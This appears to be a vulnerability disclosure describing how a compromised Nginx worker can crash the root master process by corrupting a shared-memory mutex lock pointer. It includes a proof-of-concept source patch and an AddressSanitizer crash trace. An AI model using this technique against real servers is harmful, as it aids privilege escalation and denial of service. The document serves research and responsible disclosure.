# Nginx Worker-Master CIV

## Threat model

In Nginx, the master/worker split is partly justified by security: privileged
operations are performed in the master (running as `root`), which is not
exposed to the network.

We are thus looking for "worker escape" vulnerabilities: assuming the worker is
compromised, we want to find vulnerabilities that allow it to compromise the
master, to further escalate privileges.

## Worker-Escape CIV

We found a worker escape CIV via the shared memory mutex API.

Here is a description step by step of the vulnerability:

1. A compromised guest corrupts the mutex structure in the `ngx_slab_pool_t`,
   in shared memory. Specifically, it corrupts [the lock pointer](https://hg.nginx.org/nginx/file/tip/src/core/ngx_shmtx.h#l26).
   This requires a single byte write.
2. The guest wants to force the master to dereference this corrupted pointer,
   in order to do that it crashes itself to trigger the [mutex cleanup mechanism](https://hg.nginx.org/nginx/file/default/src/os/unix/ngx_process.c#l602).
   NOTE: this could actually also happen naturally when the server shuts down.
3. As the guest dies, the master receives a SIGCHILD and executes
   `ngx_unlock_mutexes()`. In doing so it dereferences the corrupted `lock()`
   pointer and crashes. Dereference can be READ or WRITE.

Here is a proof of concept that demonstrates the vulnerability:

1. Compile Nginx with ASan, here we went for 1.21.6 but it should work on more
   recent releases.
2. Apply the following patch:
```
diff -ur nginx-1.21.6.old/src/os/unix/ngx_process_cycle.c nginx-1.21.6/src/os/unix/ngx_process_cycle.c
--- nginx-1.21.6.old/src/os/unix/ngx_process_cycle.c    2022-11-25 15:33:27.105006439 +0000
+++ nginx-1.21.6/src/os/unix/ngx_process_cycle.c        2022-11-25 15:46:45.110521658 +0000
@@ -709,6 +709,10 @@
 
     for ( ;; ) {
 
+       ngx_slab_pool_t  *sp = (ngx_slab_pool_t *) ((ngx_shm_zone_t *) ((ngx_list_part_t *) &cycle->shared_memory.part)->elts)[0].shm.addr;
+       sp->mutex.lock = NULL;
+       * (volatile int *) NULL = 0;
+
         if (ngx_exiting) {
             if (ngx_event_no_timers_left() == NGX_OK) {
                 ngx_log_error(NGX_LOG_NOTICE, cycle->log, 0, "exiting");
```
3. Run `./objs/nginx -g 'error_log stderr debug;'`
4. You should see the following crash appear:
```
=================================================================
==245==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x5606db9b699a bp 0x7ffd9d4b39f0 sp 0x7ffd9d4b39e0 T0)
==245==The signal is caused by a WRITE memory access.
==245==Hint: address points to the zero page.
    #0 0x5606db9b699a in ngx_shmtx_force_unlock src/core/ngx_shmtx.c:155
    #1 0x5606dba1dc74 in ngx_unlock_mutexes src/os/unix/ngx_process.c:602
    #2 0x5606dba1da1d in ngx_process_get_status src/os/unix/ngx_process.c:559
    #3 0x5606dba1cfc0 in ngx_signal_handler src/os/unix/ngx_process.c:463
    #4 0x7f01e717851f  (/lib/x86_64-linux-gnu/libc.so.6+0x4251f)
    #5 0x7f01e71787db in sigsuspend (/lib/x86_64-linux-gnu/libc.so.6+0x427db)
    #6 0x5606dba20281 in ngx_master_process_cycle src/os/unix/ngx_process_cycle.c:163
    #7 0x5606db97300e in main src/core/nginx.c:383
    #8 0x7f01e715fd8f  (/lib/x86_64-linux-gnu/libc.so.6+0x29d8f)
    #9 0x7f01e715fe3f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x29e3f)
    #10 0x5606db972024 in _start (/root/nginx-1.21.6/objs/nginx+0x73024)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV src/core/ngx_shmtx.c:155 in ngx_shmtx_force_unlock
==245==ABORTING
```

The patch is very simple, it (1) just corrupts the mutex from the worker's
context, (2) kills itself (`* (volatile int *) NULL = 0`) to (3) trigger the
mutex cleanup mechanism in the master, which triggers the crash. Again, the
worker killing itself is not necessary, the crash would also happen at server
shutdown.

The pointer does not have to be a NULL pointer, but we set it to NULL in this PoC.

## Impact

In theory, such exploits could be mounted on this vulnerability to compromise
the master from the guest.

In practice this particular CIV is limited in impact due to control constraints
in the mutex unlocking routine: bytes will only be overwritten if they match
the worker’s PID. Nevertheless, CIVs at such interfaces present a real risk:
less constrained bugs are realistic and may pose a real privilege escalation
threat.

## Fix

A link to the fix will be provided here when available.
